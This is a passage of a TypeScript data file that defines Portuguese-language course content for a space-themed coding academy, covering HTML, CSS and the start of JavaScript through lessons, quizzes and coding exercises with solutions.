import type { LessonExercise } from '@/types';

export interface Lesson {
  id: string;
  title: string;
  description: string;
  content: string;
  codeExample?: string;
  language: string;
  duration: number;
  xpReward: number;
  exercises?: LessonExercise[];
}

export interface Course {
  id: string;
  slug: string;
  name: string;
  planetName: string;
  description: string;
  icon: string;
  color: string;
  language: string;
  level: 'Iniciante' | 'Intermediário' | 'Avançado';
  totalXp: number;
  lessons: Lesson[];
}

export const COURSES: Course[] = [
  {
    id: 'html',
    slug: 'html',
    name: 'HTML5',
    planetName: 'Terra Digital',
    description: 'Aprenda a estruturar websites do absoluto zero até a semântica moderna.',
    icon: '🌐',
    color: '#00D4FF',
    language: 'html',
    level: 'Iniciante',
    totalXp: 290,
    lessons: [
      {
        id: 'html-1',
        title: '1. O que é HTML & Anatomia da Web',
        description: 'Descubra como a internet funciona, a diferença entre linguagens e a estrutura mestra de um site.',
        duration: 12,
        xpReward: 50,
        language: 'html',
        content: `# 🌐 Introdução ao HTML & Anatomia da Web

Bem-vindo à **Terra Digital**, cadete! Aqui começa a sua jornada para se tornar uma lenda do código.

> **💡 O que é HTML?**
> **HTML** significa *HyperText Markup Language* (Linguagem de Marcação de Hipertexto). Diferente do JavaScript ou Python, o HTML **não é uma linguagem de programação** — ele não faz cálculos matemáticos nem toma decisões lógicas. Ele é a **espinha dorsal** que define o que existe na página: onde fica o cabeçalho, os textos, os botões e as imagens.

---

### 🧩 A Anatomia de uma Tag HTML

Quase tudo no HTML é formado por **tags** que abrem e fecham em volta de um conteúdo:

\`\`\`html
<tagname atributo="valor">Conteúdo que aparece na tela</tagname>
\`\`\`

- **Tag de abertura:** \`<p>\` indica o início de um elemento (como um parágrafo).
- **Conteúdo:** O texto ou outros elementos que ficam dentro.
- **Tag de fechamento:** \`</p>\` indica o fim do elemento (note a barra \`/\`).

---

### 🏗️ A Estrutura Mestra Obrigatória

Todo documento HTML moderno segue este esqueleto inicial:

\`\`\`html
<!DOCTYPE html>
<html lang="pt-BR">
  <head>
    <meta charset="UTF-8">
    <title>Minha Primeira Página no Nexus</title>
  </head>
  <body>
    <h1>Olá, Mundo Cyberpunk!</h1>
    <p>Este é o meu primeiro passo no universo do desenvolvimento web.</p>
  </body>
</html>
\`\`\`

- \`<!DOCTYPE html>\`: Informa ao navegador que estamos usando a versão mais recente (**HTML5**).
- \`<html>\`: A tag raiz que engloba todo o documento.
- \`<head>\`: O "cérebro invisível" da página — contém o título da aba (\`<title>\`), fontes e configurações de caracteres (\`UTF-8\`).
- \`<body>\`: O corpo visível — **tudo o que o usuário enxerga e interage na tela fica aqui dentro!**`,
        codeExample: `<!DOCTYPE html>
<html lang="pt-BR">
  <head>
    <meta charset="UTF-8">
    <title>Nexus Academy</title>
  </head>
  <body>
    <h1>Base de Treinamento</h1>
    <p>Cadete conectado com sucesso!</p>
  </body>
</html>`,
        exercises: [
          {
            type: 'quiz',
            question: 'Qual é a função primordial do HTML na arquitetura de um website?',
            options: [
              'Definir a estrutura semântica e os blocos de conteúdo da página.',
              'Calcular a lógica de negócios e conectar com o banco de dados diretamente.',
              'Aplicar sombras 3D, animações dinâmicas e cores na interface.',
              'Gerenciar a velocidade de download e a segurança da rede Wi-Fi.',
            ],
            correctIndex: 0,
            explanation: 'O HTML é responsável exclusivamente pela estrutura e conteúdo. A estilização visual é papel do CSS e a interatividade lógica pertence ao JavaScript.',
          },
          {
            type: 'code',
            instruction: 'Crie um título principal <h1> dizendo "Base Nexus" e logo abaixo um parágrafo <p> com o texto "Sistema inicializado".',
            initialCode: '<!-- Digite aqui o título <h1> e o parágrafo <p> -->\n',
            expectedKeywords: ['<h1>', '</h1>', 'Base Nexus', '<p>', '</p>', 'Sistema inicializado'],
            hint: 'Use <h1>Texto do Título</h1> para criar o título principal e <p>Texto do Parágrafo</p> para criar o parágrafo.',
            solution: '<h1>Base Nexus</h1>\n<p>Sistema inicializado</p>',
          },
        ],
      },
      {
        id: 'html-2',
        title: '2. Títulos, Parágrafos & Formatação Semântica',
        description: 'Aprenda a hierarquia de títulos de h1 a h6 e como dar ênfase visual e semântica aos textos.',
        duration: 15,
        xpReward: 55,
        language: 'html',
        content: `# ✍️ Títulos, Parágrafos & Formatação Semântica

Na web moderna, a forma como você organiza os textos importa tanto para os humanos quanto para os motores de busca (como o Google) e leitores de tela para pessoas com deficiência visual.

---

### 👑 Hierarquia de Títulos (h1 até h6)

O HTML fornece seis níveis de títulos:

\`\`\`html
<h1>Título de Nível 1 — O mais importante</h1>
<h2>Título de Nível 2 — Seções principais</h2>
<h3>Título de Nível 3 — Subseções</h3>
<h4>Título de Nível 4</h4>
<h5>Título de Nível 5</h5>
<h6>Título de Nível 6 — O menor nível</h6>
\`\`\`

> **⚠️ Regra de Ouro da Web:**
> Você deve ter **apenas um único \`<h1>\` por página**! Ele representa o assunto principal daquele documento. Para subseções, use \`<h2>\` e \`<h3>\`. Nunca pule níveis (por exemplo, de \`<h1>\` direto para \`<h4>\`).

---

### 📝 Parágrafos e Quebras

- \`<p>\`: Define um bloco de parágrafo com espaçamento automático antes e depois.
- \`<br>\`: Quebra de linha simples sem iniciar um novo parágrafo (é uma tag auto-fechável, sem \`</br>\`).
- \`<hr>\`: Linha divisória horizontal entre tópicos.

---

### 🎯 Ênfase Semântica: \`<strong>\` vs \`<em>\`

- \`<strong>\`: Indica que o texto tem **alta importância ou urgência** (visualmente fica em negrito e leitores de tela alteram o tom de voz).
- \`<em>\`: Indica **ênfase e entonação** (visualmente fica em itálico).
- \`<mark>\`: Destaca o texto como se fosse um marca-texto neon!`,
        codeExample: `<h1>Relatório da Missão Orion</h1>
<h2>Setor 7: Varredura Completa</h2>
<p>Os radares detectaram uma anomalia <strong>crítica</strong> nas coordenadas externas.</p>
<p>A equipe precisa agir com <em>máxima cautela</em>.</p>`,
        exercises: [
          {
            type: 'quiz',
            question: 'Por que é uma boa prática manter apenas uma tag <h1> por página web?',
            options: [
              'Porque melhora o SEO (Google) e ajuda softwares de acessibilidade a identificar o tema principal.',
              'Porque o navegador gera um erro fatal de sintaxe se houver mais de um.',
              'Porque as tags h2 e h3 são desativadas caso existam dois títulos h1.',
              'Porque apenas designers com permissão de administrador podem usar mais de um.',
            ],
            correctIndex: 0,
            explanation: 'O <h1> é a manchete principal da página. Ter apenas um facilita a leitura de robôs de busca (SEO) e leitores de tela usados por pessoas com deficiência.',
          },
          {
            type: 'code',
            instruction: 'Crie um subtítulo <h2> com o texto "Aeronaves" e abaixo um parágrafo <p> com "Status: " seguido da palavra "URGENTE" dentro da tag <strong>.',
            initialCode: '<!-- Digite aqui o subtítulo <h2> e o parágrafo <p> com <strong> -->\n',
            expectedKeywords: ['<h2>', '</h2>', 'Aeronaves', '<p>', '</p>', '<strong>', '</strong>', 'URGENTE'],
            hint: 'Abra a tag <h2>, digite Aeronaves e feche com </h2>. Logo abaixo abra <p>, digite Status: e envolva a palavra URGENTE com as tags <strong> e </strong> antes de fechar o parágrafo.',
            solution: '<h2>Aeronaves</h2>\n<p>Status: <strong>URGENTE</strong></p>',
          },
        ],
      },
      {
        id: 'html-3',
        title: '3. Links, Hipertexto & Atributos de Navegação',
        description: 'Conecte páginas com a tag <a>, o atributo href e configurações de segurança ao abrir nova aba.',
        duration: 15,
        xpReward: 60,
        language: 'html',
        content: `# 🔗 Hiperlinks & A Teia da Web

O que torna a Web uma rede mundial interconectada é o **Hipertexto** — a capacidade de clicar em uma palavra e viajar instantaneamente para outra página ou documento.

---

### 🌐 A Tag Âncora: \`<a>\`

Para criar um link, usamos a tag \`<a>\` (de *anchor*) acompanhada do atributo obrigatório **\`href\`** (*Hypertext Reference*):

\`\`\`html
<a href="https://google.com">Acessar o Google</a>
\`\`\`

---

### 🚀 Abrindo em uma Nova Aba com Segurança

Quando queremos que o link abra em uma nova aba do navegador, adicionamos o atributo \`target="_blank"\`:

\`\`\`html
<a href="https://github.com" target="_blank" rel="noopener noreferrer">
  Ver Repositório no GitHub
</a>
\`\`\`

> **🛡️ Segurança Profissional (Tabnabbing):**
> Sempre que usar \`target="_blank"\`, adicione também \`rel="noopener noreferrer"\`. Isso impede que a página de destino maliciosa assuma o controle da sua aba de origem através do JavaScript (\`window.opener\`).

---

### 📍 Links Internos (Âncoras na Mesma Página)

Você pode criar links que rolam a página até uma seção específica usando o \`id\` do elemento:

\`\`\`html
<!-- O link aponta para o ID -->
<a href="#contato">Ir para Contato</a>

<!-- O destino que tem o ID correspondente -->
<section id="contato">
  <h2>Fale Conosco</h2>
</section>
\`\`\``,
        codeExample: `<nav>
  <a href="#inicio">Início</a> |
  <a href="#planetas">Planetas</a> |
  <a href="https://github.com" target="_blank" rel="noopener noreferrer">GitHub</a>
</nav>`,
        exercises: [
          {
            type: 'quiz',
            question: 'Qual atributo é responsável por informar o endereço de destino (URL) em um link <a>?',
            options: [
              'href (Hypertext Reference)',
              'src (Source)',
              'link (Link Pointer)',
              'to (Target Location)',
            ],
            correctIndex: 0,
            explanation: 'O atributo correto é "href". O atributo "src" é utilizado em mídias como imagens (<img>) e scripts (<script>).',
          },
          {
            type: 'code',
            instruction: 'Crie um link <a> apontando para "https://codequest.nexus" com o texto "Entrar no Nexus" e com target="_blank".',
            initialCode: '<!-- Crie seu link <a> abaixo -->\n',
            expectedKeywords: ['<a', 'href=', 'https://codequest.nexus', 'target="_blank"', 'Entrar no Nexus', '</a>'],
            hint: 'A sintaxe de uma âncora é: <a href="URL" target="_blank">Texto</a> fechando com </a>.',
            solution: '<a href="https://codequest.nexus" target="_blank">Entrar no Nexus</a>',
          },
        ],
      },
      {
        id: 'html-4',
        title: '4. Listas Ordenadas, Não Ordenadas & Menus',
        description: 'Organize itens, inventários e menus estruturados com as tags ul, ol e li.',
        duration: 12,
        xpReward: 60,
        language: 'html',
        content: `# 📋 Listas Ordenadas, Não Ordenadas & Menus

Listas são fundamentais na construção de páginas web. Na verdade, quase todo **menu de navegação**, **lista de produtos** e **feed de postagens** que você vê na internet é construído com listas HTML!

---

### 🟣 Listas Não Ordenadas: \`<ul>\`

Usadas quando a sequência dos itens não importa (geram bolinhas / bullets):

\`\`\`html
<ul>
  <li>Capacete Espacial</li>
  <li>Tanque de Oxigênio</li>
  <li>Propulsor de Íons</li>
</ul>
\`\`\`

- \`<ul>\` = *Unordered List* (Lista Não Ordenada)
- \`<li>\` = *List Item* (Item de Lista — obrigatório dentro de \`<ul>\` ou \`<ol>\`)

---

### 🔢 Listas Ordenadas: \`<ol>\`

Usadas quando a ordem dos fatores é crucial (geram numeração automática 1, 2, 3...):

\`\`\`html
<ol>
  <li>Ligar os motores da nave</li>
  <li>Calibrar as coordenadas do Nexus</li>
  <li>Iniciar salto no hiperespaço</li>
</ol>
\`\`\`

---

### 💡 Transformando Listas em Menus de Navegação

Na indústria, agrupamos links dentro de listas para manter a acessibilidade semântica:

\`\`\`html
<nav>
  <ul>
    <li><a href="/">Dashboard</a></li>
    <li><a href="/galaxy">Galáxia</a></li>
    <li><a href="/profile">Perfil</a></li>
  </ul>
</nav>
\`\`\``,
        codeExample: `<h3>Habilidades do Programador</h3>
<ul>
  <li>HTML5 Semântico</li>
  <li>CSS3 & Responsividade</li>
  <li>JavaScript Moderno</li>
</ul>`,
        exercises: [
          {
            type: 'quiz',
            question: 'Qual tag representa um item individual dentro de uma lista (seja ordenada ou não)?',
            options: [
              '<li> (List Item)',
              '<item> (Item Element)',
              '<ul> (Unordered List)',
              '<list> (List Container)',
            ],
            correctIndex: 0,
            explanation: 'A tag <li> (List Item) é a única filha direta válida para as tags <ul> e <ol>.',
          },
          {
            type: 'code',
            instruction: 'Crie uma lista não ordenada (<ul>) contendo 3 itens (<li>): "HTML5", "CSS3" e "JavaScript".',
            initialCode: '<!-- Crie sua lista não ordenada <ul> com 3 itens <li> aqui -->\n',
            expectedKeywords: ['<ul>', '</ul>', '<li>', '</li>', 'HTML5', 'CSS3', 'JavaScript'],
            hint: 'Abra a tag <ul>, insira cada um dos três itens envolvidos por <li> e </li>, e finalize fechando com </ul>.',
            solution: '<ul>\n  <li>HTML5</li>\n  <li>CSS3</li>\n  <li>JavaScript</li>\n</ul>',
          },
        ],
      },
      {
        id: 'html-5',
        title: '5. Imagens, Mídia & Acessibilidade Web',
        description: 'Adicione imagens na página com a tag <img>, entenda caminhos relativos e a importância vital do atributo alt.',
        duration: 15,
        xpReward: 65,
        language: 'html',
        content: `# 🖼️ Imagens, Mídia & Acessibilidade Web

Uma imagem vale mais que mil palavras, e na web ela precisa ser rápida, responsiva e inclusiva para todos os usuários.

---

### 👁️ A Tag de Imagem: \`<img>\`

Diferente de parágrafos ou títulos, a tag \`<img>\` é um **elemento vazio** (*void element* ou *self-closing*). Ela **não possui tag de fechamento** (\`</img>\` não existe!):

\`\`\`html
<img src="https://exemplo.com/foto.jpg" alt="Descrição da imagem" width="300" height="200" />
\`\`\`

---

### 🔑 Os Dois Atributos Obrigatórios

1. **\`src\` (*Source*):** O caminho onde a imagem está salva. Pode ser:
   - Um link externo na internet (\`https://...\`).
   - Um arquivo local do seu projeto (\`./imagens/avatar.png\`).
2. **\`alt\` (*Alternative Text*):** O texto alternativo descritivo.

> **❤️ Por que o \`alt\` é indispensável?**
> 1. **Acessibilidade:** Pessoas com deficiência visual utilizam programas leitores de tela que leem o texto do \`alt\` em voz alta.
> 2. **Falhas de Conexão:** Se a imagem não puder ser baixada por instabilidade na rede, o texto do \`alt\` aparece no lugar para o usuário entender o contexto.
> 3. **SEO:** Mecanismos de busca indexam o conteúdo visual através do texto alternativo.

---

### 📏 Dimensões: \`width\` e \`height\`

Você pode especificar a largura (\`width\`) e altura (\`height\`) em pixels para evitar que a página "dê saltos" visuais (*Cumulative Layout Shift*) enquanto a imagem está carregando.`,
        codeExample: `<figure>
  <img 
    src="https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=400" 
    alt="Arte abstrata com tons de azul e roxo neon" 
    width="400" 
  />
  <figcaption>Arte futurista gerada para o CodeQuest Nexus</figcaption>
</figure>`,
        exercises: [
          {
            type: 'quiz',
            question: 'Por que a tag <img> não precisa de tag de fechamento como </img>?',
            options: [
              'Porque é um elemento vazio (void element), cujo conteúdo e propriedades são passados através de atributos.',
              'Porque foi criada recentemente no HTML5 e as versões antigas exigiam fechamento.',
              'Porque as imagens são renderizadas fora da estrutura do navegador.',
              'Na verdade é obrigatório fechar com </img> em páginas publicadas.',
            ],
            correctIndex: 0,
            explanation: 'Elementos como <img>, <br>, <hr> e <input> não contêm texto interno entre duas tags, por isso não possuem tag de fechamento.',
          },
          {
            type: 'code',
            instruction: 'Adicione uma tag <img> com src="https://picsum.photos/300/200" e o atributo alt="Robô astronauta navegando no espaço".',
            initialCode: '<!-- Adicione a tag de imagem abaixo -->\n',
            expectedKeywords: ['<img', 'src=', 'https://picsum.photos/300/200', 'alt=', 'Robô astronauta navegando no espaço'],
            hint: 'Utilize a tag de imagem informando a URL na propriedade src e uma descrição textual acessível no atributo alt.',
            solution: '<img src="https://picsum.photos/300/200" alt="Robô astronauta navegando no espaço" />',
          },
        ],
      },
    ],
  },
  {
    id: 'css',
    slug: 'css',
    name: 'CSS3',
    planetName: 'Neon City',
    description: 'Transforme esqueletos cinzentos em interfaces futuristas com estilos e layout.',
    icon: '🎨',
    color: '#8B5CF6',
    language: 'css',
    level: 'Iniciante',
    totalXp: 190,
    lessons: [
      {
        id: 'css-1',
        title: '1. O que é CSS & Sintaxe Estelar',
        description: 'Aprenda a conectar folhas de estilo, seletores de classe e propriedades visuais.',
        duration: 14,
        xpReward: 60,
        language: 'css',
        content: `# 🎨 O que é CSS & Sintaxe Neon

Bem-vindo a **Neon City**, cadete! Se o HTML é a estrutura óssea do seu habitat espacial, o **CSS** (*Cascading Style Sheets*) é a pele, os circuitos iluminados e a atmosfera que dão vida ao universo digital.

> **💡 O Papel do CSS:**
> O CSS separa o conteúdo visual da marcação lógica. Com ele, você controla cores, tipografia, espaçamentos, animações e a adaptação do site para qualquer tamanho de tela (de relógios inteligentes a telas espaciais ultrawide).

---

### 🧩 Anatomia de uma Regra CSS

Uma regra CSS é composta por um **seletor** e um bloco de **declarações**:

\`\`\`css
seletor {
  propriedade: valor;
}
\`\`\`

- **Seletor:** Indica qual elemento HTML receberá o estilo (ex: \`h1\`, \`.card\`, \`#menu\`).
- **Propriedade:** O aspecto que você deseja alterar (ex: \`color\`, \`background-color\`, \`font-size\`).
- **Valor:** A definição aplicada (ex: \`#00D4FF\`, \`16px\`, \`bold\`).
- **Ponto e vírgula (\`;\`):** Obrigatório ao final de cada declaração para evitar falhas em cadeia!

---

### 🎯 Tipos de Seletores Mais Comuns

1. **Seletor de Elemento:** Afeta todas as tags daquele tipo:
   \`\`\`css
   p {
     color: #E2E8F0;
   }
   \`\`\`
2. **Seletor de Classe (\`.\`):** Reutilizável em múltiplos elementos. É o padrão da indústria:
   \`\`\`css
   .card-cyber {
     background-color: #0B1120;
     border: 1px solid #8B5CF6;
   }
   \`\`\`
3. **Seletor de ID (\`#\`):** Específico para um único elemento único na página:
   \`\`\`css
   #painel-mestre {
     padding: 24px;
   }
   \`\`\`

> **⚠️ Armadilha Comum:**
> Esquecer o ponto (\`.\`) ao estilizar uma classe no arquivo \`.css\` faz o navegador achar que você está estilizando uma tag HTML com aquele nome! Se sua classe é \`class="botao"\`, no CSS você deve escrever obrigatoriamente \`.botao\`.

> **🛡️ Boa Prática:**
> Prefira seletores de classe a IDs para estilização visual. Classes têm especificidade balanceada e facilitam a criação de componentes reutilizáveis.`,
        codeExample: `/* Estilo do Terminal de Neon City */
.card-missao {
  background: #090E1A;
  border: 1px solid #8B5CF6;
  border-radius: 8px;
  padding: 20px;
  color: #F8FAFC;
}

.card-missao h2 {
  color: #00D4FF;
  margin-top: 0;
}`,
        exercises: [
          {
            type: 'quiz',
            question: 'Se você criou no HTML uma tag com class="status-alerta", como essa classe deve ser referenciada dentro do arquivo CSS?',
            options: [
              'status-alerta { color: red; }',
              '#status-alerta { color: red; }',
              '.status-alerta { color: red; }',
              '*status-alerta { color: red; }'
            ],
            correctIndex: 2,
            explanation: 'Classes no CSS são obrigatoriamente precedidas por um ponto (.) como .status-alerta, enquanto a cerquilha (#) é reservada exclusivamente para IDs.'
          },
          {
            type: 'fillblank',
            title: 'Construindo o Cartão Neon',
            instruction: 'Complete a regra CSS para definir a classe, a cor de fundo e a borda do cartão.',
            codeSnippet: `{{seletor_classe}} {
  background-color: {{fundo}};
  color: #FFFFFF;
  border: 1px solid #8B5CF6;
}`,
            blanks: [
              {
                id: 'seletor_classe',
                placeholder: 'seletor de classe',
                expectedValues: ['.card-neon', '.card'],
                hint: 'Lembre-se de iniciar com o ponto (.) seguido do nome da classe (ex: .card-neon).'
              },
              {
                id: 'fundo',
                placeholder: 'cor de fundo hexadecimal',
                expectedValues: ['#0b1120', '#000000', '#090e1a'],
                hint: 'Pense em um tom escuro cyberpunk como #0b1120 ou #000000.'
              }
            ],
            explanation: 'Perfeito! A sintaxe CSS está impecável com o seletor de classe prefixado por ponto e o código de cor hexadecimal válido.'
          },
          {
            type: 'bughunt',
            title: 'Sintaxe Corrompida no Painel de Bordo',
            scenario: 'O desenvolvedor novato tentou criar a classe do botão de lançamento, mas a cor do texto e a borda não estão sendo aplicadas.',
            buggyCode: `botao-ignicao {
  color #00D4FF;
  border: 1px solid #00D4FF;
}`,
            expectedKeywords: ['.botao-ignicao', 'color:', ';'],
            forbiddenKeywords: ['botao-ignicao {', 'color #'],
            hint: 'Verifique se falta o caractere de classe no nome do seletor e se há dois pontos separando a propriedade do valor da cor.',
            solutionExplanation: 'Bug neutralizado! A classe agora possui o ponto inicial (.botao-ignicao) e a propriedade color possui os dois pontos obrigatórios.'
          }
        ]
      },
      {
        id: 'css-2',
        title: '2. O Modelo de Caixa (Box Model)',
        description: 'Domine Content, Padding, Border, Margin e a propriedade box-sizing.',
        duration: 15,
        xpReward: 65,
        language: 'css',
        content: `# 📦 O Modelo de Caixa (Box Model)

No CSS, **absolutamente tudo é uma caixa retangular**! Entender o Modelo de Caixa é o divisor de águas entre quem briga com o layout e quem tem controle cirúrgico sobre a tela.

---

### 🧱 As 4 Camadas da Caixa

De dentro para fora, toda caixa possui 4 camadas fundamentais:

1. **Content (Conteúdo):** Onde o texto ou imagem realmente vive. Controlado por \`width\` e \`height\`.
2. **Padding (Preenchimento Interno):** O espaço respirável entre o conteúdo e a borda. Fica **dentro** da caixa.
3. **Border (Borda):** A moldura ao redor do padding e do conteúdo.
4. **Margin (Margem Externa):** O espaço entre esta caixa e as outras caixas vizinhas na página.

\`\`\`
+---------------------------+
|          Margin           |
|  +---------------------+  |
|  |       Border        |  |
|  |  +---------------+  |  |
|  |  |    Padding    |  |  |
|  |  |  +---------+  |  |  |
|  |  |  | Content |  |  |  |
|  |  |  +---------+  |  |  |
|  |  +---------------+  |  |
|  +---------------------+  |
+---------------------------+
\`\`\`

---

### 🛡️ O Salvador de Vidas: \`box-sizing: border-box\`

Por padrão no CSS antigo (\`content-box\`), se você definir \`width: 200px\` e adicionar \`padding: 20px\`, o navegador soma tudo: a caixa fica com **240px de largura real**! Isso quebrava layouts e causava rolagem horizontal indesejada.

Com \`box-sizing: border-box\`, a largura que você define é a largura total final:

\`\`\`css
* {
  box-sizing: border-box;
}
\`\`\`

> **💡 Dica Pro:**
> Praticamente todo projeto moderno no mundo real adiciona um "CSS Reset" no início do arquivo aplicando \`box-sizing: border-box\` em todos os elementos. Isso impede que espaçamentos internos aumentem o tamanho total dos componentes.

> **⚠️ Armadilha Comum:**
> Margens verticais contíguas podem sofrer de "colapso de margens" (*margin collapse*), onde duas margens de 20px se sobrepõem resultando em apenas 20px de distância em vez de 40px.`,
        codeExample: `/* Configuração ideal do Modelo de Caixa */
* {
  box-sizing: border-box;
  margin: 0;
  padding: 0;
}

.painel-cyber {
  width: 320px;
  padding: 24px;
  border: 2px solid #00D4FF;
  margin: 20px auto;
  background: #0F172A;
  border-radius: 12px;
}`,
        exercises: [
          {
            type: 'quiz',
            question: 'Qual é o efeito de aplicar "box-sizing: border-box" em um elemento?',
            options: [
              'Remove completamente as bordas e preenchimentos do elemento.',
              'Faz com que o padding e a borda sejam incluídos dentro da largura (width) total especificada.',
              'Aumenta automaticamente a margem externa para afastar elementos vizinhos.',
              'Torna o elemento invisível até que o mouse passe sobre ele.'
            ],
            correctIndex: 1,
            explanation: 'Com border-box, a largura e altura declaradas passam a ser o tamanho total definitivo do elemento, evitando que padding ou bordas façam a caixa estourar o layout.'
          },
          {
            type: 'code',
            instruction: 'Crie uma classe .escudo-energia com padding de 20px, borda sólida ciano (#00D4FF) de 2px e fundo escuro (#0B1120).',
            initialCode: `/* Digite a regra CSS abaixo */\n`,
            expectedKeywords: ['.escudo-energia', 'padding:', '20px', 'border:', '#00D4FF', 'background'],
            hint: 'Declare a classe .escudo-energia abrindo chaves. Dentro dela, configure padding: 20px;, border: 2px solid #00D4FF; e background-color: #0B1120;.',
            solution: `.escudo-energia {
  padding: 20px;
  border: 2px solid #00D4FF;
  background-color: #0B1120;
}`
          }
        ]
      },
      {
        id: 'css-3',
        title: '3. Flexbox & Alinhamento Espacial',
        description: 'Posicione elementos em uma dimensão com display flex, justify-content e align-items.',
        duration: 16,
        xpReward: 65,
        language: 'css',
        content: `# 🌌 Flexbox & Alinhamento Espacial

No passado, alinhar elementos no centro de uma tela era uma dor de cabeça que exigia hacks com tabelas ou floats. O **Flexbox** (*Flexible Box Layout*) chegou para revolucionar a forma como distribuímos espaços e alinhamos itens.

---

### 🚀 Ativando o Contêiner Flexível

Para usar Flexbox, você aplica \`display: flex\` no elemento pai (**Flex Container**). Automaticamente, todos os seus filhos diretos tornam-se **Flex Items**:

\`\`\`css
.barra-navegacao {
  display: flex;
}
\`\`\`

---

### 🧭 Os Dois Eixos Fundamentais

O Flexbox opera com dois eixos ortogonais:

1. **Main Axis (Eixo Principal):** A direção em que os itens fluem (padrão: horizontal/linha).
   - Controlado por: \`justify-content\`
   - Opções: \`flex-start\`, \`center\`, \`flex-end\`, \`space-between\`, \`space-around\`.
2. **Cross Axis (Eixo Transversal):** Perpendicular ao eixo principal (padrão: vertical).
   - Controlado por: \`align-items\`
   - Opções: \`stretch\` (padrão), \`center\`, \`flex-start\`, \`flex-end\`.

---

### 🎯 A Fórmula Mágica da Centralização Total

Para centralizar qualquer elemento perfeitamente no meio da tela:

\`\`\`css
.centralizador {
  display: flex;
  justify-content: center; /* Centro no eixo horizontal */
  align-items: center;     /* Centro no eixo vertical */
}
\`\`\`

> **💡 Dica Pro:**
> Use a propriedade \`gap: 16px;\` no contêiner flexível. Ela cria espaçamento automático entre os itens sem precisar adicionar margens em cada elemento filho!

> **⚠️ Armadilha Comum:**
> Esquecer de aplicar \`display: flex\` no elemento pai. As propriedades \`justify-content\` e \`align-items\` só têm efeito em elementos que são contêineres flexíveis.`,
        codeExample: `/* Barra de Navegação Futurista com Flexbox */
.navbar-nexus {
  display: flex;
  justify-content: space-between;
  align-items: center;
  padding: 16px 24px;
  background: #0B1120;
  border-bottom: 1px solid #1E293B;
}

.nav-links {
  display: flex;
  gap: 20px;
}`,
        exercises: [
          {
            type: 'quiz',
            question: 'Qual propriedade Flexbox é responsável por alinhar os elementos ao longo do EIXO TRANSVERSAL (vertical por padrão)?',
            options: [
              'justify-content',
              'flex-direction',
              'align-items',
              'gap-alignment'
            ],
            correctIndex: 2,
            explanation: 'align-items controla o alinhamento no eixo transversal (cross-axis), enquanto justify-content controla o eixo principal (main-axis).'
          },
          {
            type: 'fillblank',
            title: 'Configurando a Estação Flex',
            instruction: 'Complete as propriedades para transformar a barra em um contêiner flexível distribuindo os itens com espaço entre eles.',
            codeSnippet: `.menu-navegacao {
  display: {{tipo_display}};
  justify-content: {{alinhamento_principal}};
  align-items: center;
  gap: 16px;
}`,
            blanks: [
              {
                id: 'tipo_display',
                placeholder: 'tipo de display',
                expectedValues: ['flex'],
                hint: 'Digite o valor que ativa o Flexible Box Layout.'
              },
              {
                id: 'alinhamento_principal',
                placeholder: 'distribuição espacial',
                expectedValues: ['space-between', 'center', 'space-around'],
                hint: 'Pense na propriedade que empurra um item para cada extremidade (space-between).'
              }
            ],
            explanation: 'Excelente! Com display: flex e justify-content: space-between, os itens do menu se organizam harmoniosamente pelas extremidades da interface.'
          },
          {
            type: 'code',
            instruction: 'Defina a classe .painel-central com display flex, itens centralizados em ambos os eixos e gap de 12px.',
            initialCode: `/* Digite seu código Flexbox abaixo */\n`,
            expectedKeywords: ['.painel-central', 'display: flex', 'justify-content: center', 'align-items: center', 'gap: 12px'],
            hint: 'Declare .painel-central com display: flex;, justify-content: center;, align-items: center; e gap: 12px;.',
            solution: `.painel-central {
  display: flex;
  justify-content: center;
  align-items: center;
  gap: 12px;
}`
          }
        ]
      }
    ],
  },
  {
    id: 'javascript',
    slug: 'javascript',
    name: 'JavaScript',
    planetName: 'Cyber Core',
    description: 'Dê vida, dinamismo e inteligência computacional às suas aplicações.',
    icon: '⚡',
    color: '#FFD700',
    language: 'javascript',
    level: 'Intermediário',
    totalXp: 190,
    lessons: [
      {
        id: 'js-1',
        title: '1. O Reator de Energia: Variáveis, Tipos & Operadores',
        description: 'Domine const, let, tipos de dados primitivos e a lógica do motor de execução.',
        duration: 15,
        xpReward: 60,
        language: 'javascript',
        content: `# ⚡ O Reator de Energia: Variáveis & Tipos

Bem-vindo ao **Cyber Core**, o coração pulsar da Galáxia de Código! Se o HTML é a estrutura e o CSS é o design, o **JavaScript** é o sistema nervoso autônomo que processa dados, responde a cliques e toma decisões inteligentes.

> **💡 O que é JavaScript?**
> Criado em 1995 por Brendan Eich em apenas 10 dias, o JavaScript evoluiu para se tornar a linguagem mais utilizada do planeta. Hoje ela roda nos navegadores, nos servidores (Node.js), em satélites e em robôs de inteligência artificial.

---

### 📦 Declarando Dados: \`const\` vs \`let\`

No JavaScript moderno (ES6+), abandonamos a antiga palavra-chave \`var\` devido a problemas de escopo global e vazamento de variáveis. Hoje seguimos esta regra de ouro:

1. **\`const\` (Constante):** Use por padrão para quase tudo! Garante que o identificador não pode ser reatribuído:
   \`\`\`javascript
   const nomeNave = "Nexus One";
   const velocidadeDobra = 9.8;
   \`\`\`
2. **\`let\` (Variável Reatribuível):** Use apenas quando o valor for comprovadamente mudar ao longo do tempo (como contadores ou placares):
   \`\`\`javascript
   let escudos = 100;
   escudos = 85; // Permitido com let!
   \`\`\`

---

### 🧬 Os Tipos Primitivos do Nexus

- **String:** Textos delimitados por aspas simples, duplas ou crases (Template Literals):
  \`\`\`javascript
  const piloto = "Capitã Sarah";
  const status = \`Piloto ativo: \${piloto}\`;
  \`\`\`
- **Number:** Números inteiros ou decimais: \`const xp = 250;\`
- **Boolean:** Verdadeiro ou falso: \`const sistemaOnline = true;\`
- **Undefined:** Variável declarada que ainda não recebeu valor.
- **Null:** Ausência intencional de valor: \`let alvoAtual = null;\`

> **⚠️ Armadilha Comum:**
> Tentar reatribuir uma variável declarada com \`const\` dispara um erro fatal \`TypeError: Assignment to constant variable\`. Se a variável precisa variar, declare-a com \`let\`!

> **🛡️ Boa Prática:**
> Sempre prefira comparações estritas com três iguais (\`===\`). O operador duplo (\`==\`) faz coerções de tipo bizarras (ex: \`0 == false\` é verdadeiro, mas \`0 === false\` é falso como esperado).`,
        codeExample: `// Painel de Telemetria do Cyber Core
const nomeAgente = "Neo";
let nivelAcesso = 1;
const sistemaOperacional = "NexusOS v4";

// Subindo de nível na academia
nivelAcesso += 1;

console.log(\`Agente: \${nomeAgente} | Nível: \${nivelAcesso}\`);`,
        exercises: [
          {
            type: 'quiz',
            question: 'Por que o padrão da indústria moderna recomenda declarar variáveis com "const" por padrão em vez de "let"?',
            options: [
